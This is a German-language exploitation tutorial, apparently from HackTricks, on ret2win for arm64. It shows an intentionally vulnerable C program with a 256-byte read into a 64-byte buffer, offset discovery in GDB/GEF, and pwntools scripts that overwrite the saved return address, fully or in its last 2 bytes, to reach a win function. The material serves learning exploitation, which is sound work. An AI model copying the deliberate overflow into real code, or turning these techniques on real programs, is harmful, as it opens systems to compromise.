# Ret2win - arm64

{{#include ../../../banners/hacktricks-training.md}}

Finden Sie eine Einführung in arm64 in:

{{#ref}}
../../../macos-hardening/macos-security-and-privilege-escalation/macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md
{{#endref}}

## Code&#x20;
```c
#include <stdio.h>
#include <unistd.h>

void win() {
printf("Congratulations!\n");
}

void vulnerable_function() {
char buffer[64];
read(STDIN_FILENO, buffer, 256); // <-- bof vulnerability
}

int main() {
vulnerable_function();
return 0;
}
```
Kompilieren ohne pie und canary:
```bash
clang -o ret2win ret2win.c -fno-stack-protector -Wno-format-security -no-pie
```
## Offset finden

### Musteroption

Dieses Beispiel wurde mit [**GEF**](https://github.com/bata24/gef) erstellt:

Starte gdb mit gef, erstelle ein Muster und verwende es:
```bash
gdb -q ./ret2win
pattern create 200
run
```
<figure><img src="../../../images/image (1205).png" alt=""><figcaption></figcaption></figure>

arm64 wird versuchen, zur Adresse im Register x30 (das kompromittiert wurde) zurückzukehren. Wir können das nutzen, um den Muster-Offset zu finden:
```bash
pattern search $x30
```
<figure><img src="../../../images/image (1206).png" alt=""><figcaption></figcaption></figure>

**Der Offset beträgt 72 (9x48).**

### Stack-Offset-Option

Beginnen Sie damit, die Stack-Adresse zu erhalten, an der das pc-Register gespeichert ist:
```bash
gdb -q ./ret2win
b *vulnerable_function + 0xc
run
info frame
```
<figure><img src="../../../images/image (1207).png" alt=""><figcaption></figcaption></figure>

Setzen Sie nun einen Haltepunkt nach dem `read()` und fahren Sie fort, bis das `read()` ausgeführt wird, und setzen Sie ein Muster wie 13371337:
```
b *vulnerable_function+28
c
```
<figure><img src="../../../images/image (1208).png" alt=""><figcaption></figcaption></figure>

Finde heraus, wo dieses Muster im Speicher gespeichert ist:

<figure><img src="../../../images/image (1209).png" alt=""><figcaption></figcaption></figure>

Dann: **`0xfffffffff148 - 0xfffffffff100 = 0x48 = 72`**

<figure><img src="../../../images/image (1210).png" alt="" width="339"><figcaption></figcaption></figure>

## Kein PIE

### Regulär

Hole dir die Adresse der **`win`** Funktion:
```bash
objdump -d ret2win | grep win
ret2win:     file format elf64-littleaarch64
00000000004006c4 <win>:
```
Exploit:
```python
from pwn import *

# Configuration
binary_name = './ret2win'
p = process(binary_name)

# Prepare the payload
offset = 72
ret2win_addr = p64(0x00000000004006c4)
payload = b'A' * offset + ret2win_addr

# Send the payload
p.send(payload)

# Check response
print(p.recvline())
p.close()
```
<figure><img src="../../../images/image (1211).png" alt="" width="375"><figcaption></figcaption></figure>

### Off-by-1

Tatsächlich wird dies eher wie ein Off-by-2 im gespeicherten PC im Stack sein. Anstatt die gesamte Rücksprungadresse zu überschreiben, werden wir **nur die letzten 2 Bytes** mit `0x06c4` überschreiben.
```python
from pwn import *

# Configuration
binary_name = './ret2win'
p = process(binary_name)

# Prepare the payload
offset = 72
ret2win_addr = p16(0x06c4)
payload = b'A' * offset + ret2win_addr

# Send the payload
p.send(payload)

# Check response
print(p.recvline())
p.close()
```
<figure><img src="../../../images/image (1212).png" alt="" width="375"><figcaption></figcaption></figure>

Ein weiteres Off-by-One-Beispiel in ARM64 finden Sie unter [https://8ksec.io/arm64-reversing-and-exploitation-part-9-exploiting-an-off-by-one-overflow-vulnerability/](https://8ksec.io/arm64-reversing-and-exploitation-part-9-exploiting-an-off-by-one-overflow-vulnerability/), das ein echtes Off-by-**one** in einer fiktiven Schwachstelle ist.

## Mit PIE

> [!TIP]
> Kompilieren Sie die Binärdatei **ohne das `-no-pie` Argument**

### Off-by-2

Ohne einen Leak kennen wir die genaue Adresse der Gewinnfunktion nicht, aber wir können den Offset der Funktion von der Binärdatei kennen und wissen, dass die Rücksprungadresse, die wir überschreiben, bereits auf eine nahe Adresse zeigt. Es ist möglich, den Offset zur Gewinnfunktion (**0x7d4**) in diesem Fall zu leaken und einfach diesen Offset zu verwenden:

<figure><img src="../../../images/image (1213).png" alt="" width="563"><figcaption></figcaption></figure>
```python
from pwn import *

# Configuration
binary_name = './ret2win'
p = process(binary_name)

# Prepare the payload
offset = 72
ret2win_addr = p16(0x07d4)
payload = b'A' * offset + ret2win_addr

# Send the payload
p.send(payload)

# Check response
print(p.recvline())
p.close()
```
{{#include ../../../banners/hacktricks-training.md}}
